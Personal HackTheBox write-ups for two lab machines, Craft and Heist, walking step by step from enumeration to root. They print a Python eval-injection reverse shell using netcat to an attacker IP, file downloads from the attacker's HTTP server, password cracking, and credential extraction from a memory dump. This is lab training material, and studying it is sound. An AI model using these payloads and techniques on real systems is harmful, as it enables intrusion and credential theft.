# This is where my writeups for hackthebox will go!

Hackthebox is a website where people upload vulnerable machines for people to hack into. Most of these will test one or two skills or specific vulnerabilities but doing many will give hackers a large understanding of various ways someone may be able to hack into a machine, whilst also making them aware of current exploits that may be on their own systems. 

At the time of writing, I have "Owned" <ins> 18 users </ins> and <ins> 13 systems </ins>

User owns means that I obtained a user flag... essentially, I managed to get access to the account of a normal user on the target machine. 
System own means that I obtained a root flag... where I have admin privileges on the machine. This is the end goal for all hackthebox machines and allows complete control of the system.

## Craft Writeup:

One of my favourite machines so far on hackthebox! This felt like a proper hack with custom exploits and having to be able to understand the system before exploting it.
The custom API forces you to look for things that could be vulnerable. This box is medium difficulty.

### Port scan:
`PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) 443/tcp open ssl nginx 1.15.8 6022/tcp open ssh (protocol 2.0) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port6022-TCP:V=7.80%I=7%D=11/21%Time=5DD6F159%P=x86_64-pc-linux-gnu%r(N SF:ULL,C,"SSH-2.0-Go\r\n"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

So we know that it's Running nginx 1.15.8 On port 6022, ssh 2.0-go

 https://10.10.10.110/ --> get webpage

check certificate --> craft.htb API link goes to api.craft.htb URL

Your system will check the hosts file first before looking up a site on the DNS servers defined in your network settings

Edit /etc/hosts.txt to have 10.10.10.110 api.craft.htb

Click API link again, taken to API page. Other link on home page top right is gogs.craft.htb Add gogs.craft.htb to hosts file

https://api.craft.htb/api/brew/ https://api.craft.htb/api/auth/login needs password

In repo https://gogs.craft.htb/Craft/craft-api/compare/4fd8dbf8422cbf28f8ec96af54f16891dfdd7b95...10e3ba4f0a09c778d7cec673f28d410b73455a86

auth=('dinesh', '4aUh0A8PbVJxgd')

Try in /auth/login...

{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc0MzcxMDExfQ.hbUYCLi6US-Ka911usBo9BL4C5p87VRQAKx3jv9CJsM"}

https://api.craft.htb/api/auth/check makes sure token is valid...

Can use login page to login as dinesh.

https://gogs.craft.htb/Craft/craft-api/issues/2

curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'

could use token from earlier??

https://gogs.craft.htb/Craft/craft-api/src/master/tests/test.py

use test.py, add login from earlier to code... Get rid of warnings with

import urllib3 urllib3.disable_warnings()

when a user is able to provide the input, eval() will execute anything that's feeded to it. A user could build a string where additional python code is executed, such as erasing all files on the system or spawning a reverse shell. Therefore, eval()should never be used to process user input.

https://gogs.craft.htb/Craft/craft-api/commit/c414b160578943acfe2e158e89409623f41da4c6

### We can use eval function to run our own malicious code on the server!!
```python 
make sure the ABV value is sane.
    if eval('%s > 1' % request.json['abv']):
        return "ABV must be a decimal value less than 1.0", 400
    else:
        create_brew(request.json)
        return None, 201 
 ```
We can then use this bit of code to open a reverse shell...

     
`brew_dict['abv'] = "import('os').system('nc 10.10.15.75 1234 -e /bin/sh')"`

> nc -nvlp 1234

Drop shell!!!!!

cd /opt/app/craft_api cd /opt/app run dbtest.py

`{'id': 12, 'brewer': '10 Barrel Brewing Company', 'name': 'Pub Beer', 'abv': Decimal('0.050')}`

can't edit dbtest, use simplehttp server to upload an edited file...

on your kali : python -m SimpleHTTPServer 5555 on your target box: wget http://ip/filename

python -m SimpleHTTPServer 5555 wget http://10.10.15.75:5555/dbtestME.py

edit dbtest.py so sql = "SELECT database()" Run edited code... {'database()': 'craft'}

sql = "SELECT *FROM user" {'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}

result = cursor.fetchone() --> result = cursor.fetchall()

[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]

log in to gogs as gilfoyle

id_rsa file...

use id_rsa and pass for gilfoyle to ssh in

ssh -i hash gilfoyle@10.10.10.110

### USER FLAG

cd /usr/local/bin vault file... The Vault SSH secrets engine provides secure authentication and authorization for access to machines via the SSH protocol.

https://gogs.craft.htb/gilfoyle/craft-infra/commit/72bd340e48bd5565fd6c388deb124f39a93d5879

root OTP set

https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html

An authenticated client requests credentials from the Vault server and, If authorized, is issued an OTP. An attacker could spoof the Vault server returning a successful request.

/usr/local/bin$ vault write ssh/creds/root_otp ip=10.10.10.110 key 15f433c1-fb4f-7917-e6a5-e180d6d7bf3d

ssh into box with key as password

### ROOT FLAG



I completed this box during my first semester and it was the most challenging and engaging yet. The ones that I have done at the time of writing are a bit harder and some just as interesting which I will upload soon!


## Heist Writeup:

This is one of the first windows machines I hacked and was a great learning experience. From this, I learnt of tools that would help me in future machines.

`PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49669/tcp open msrpc Microsoft Windows RPC`

http://10.10.10.149/login.php login as guest

http://10.10.10.149/attachments/config.txt Cisco router config^^^

> gobuster dir -e -u http://10.10.10.149/ -w /usr/share/wordlists/dirb/common.txt

`http://10.10.10.149/attachments (Status: 301) http://10.10.10.149/css (Status: 301) http://10.10.10.149/images (Status: 301) http://10.10.10.149/Images (Status: 301) http://10.10.10.149/index.php (Status: 302) http://10.10.10.149/js (Status: 301)`

One username on windows server is Hazard... hostname ios-1

Crack cisco passwords with john:

enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91---> stealth1agent

Cisco type 7 password cracker --> http://www.ifm.net.nz/cookbooks/passwordcracker.html

username rout3r password 7 0242114B0E143F015F5D1E161713--> $uperP@ssword

username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 -- > Q4)sJu\Y8qz*A3?d

A SID, short for security identifier, is a number used to identify user, group, and computer accounts in Windows.

lookupsid.py: This script allows you to bruteforce the Windows SID, aiming at finding remote users/groups.

https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/

get impacket here: https://github.com/SecureAuthCorp/impacket/tree/master/examples

./lookupsid.py hazard@10.10.10.149 use password > stealthagent

`500: SUPPORTDESK\Administrator (SidTypeUser) 501: SUPPORTDESK\Guest (SidTypeUser) 503: SUPPORTDESK\DefaultAccount (SidTypeUser) 504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser) 513: SUPPORTDESK\None (SidTypeGroup) 1008: SUPPORTDESK\Hazard (SidTypeUser) 1009: SUPPORTDESK\support (SidTypeUser) 1012: SUPPORTDESK\Chase (SidTypeUser) 1013: SUPPORTDESK\Jason (SidTypeUser)`

> evil-winrm -i 10.10.10.149 -u Chase -p "Q4)sJu\Y8qz*A3?d" DROP SHELL! (powershell)

cd Desktop

### USER FLAG!!

Get-Process --procdump and sysinternals...

psexec... use simplehttpserver to upload .exe to machine...

$client = new-object System.Net.WebClient $client.DownloadFile(“http://10.10.14.182:8000/PSTools/PsExec.exe”,“C:\Users\Chase\Documents\PsExec.exe”) same for procdump.exe

firefox.exe process procdump -ma firefox.exe...dmp download C:\Users\Chase\Videos /root

strings .dmp file | grep 'admin'

Password = 4dD!5}x/re8]FBuZ

> evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'

### ROOT FLAG!!
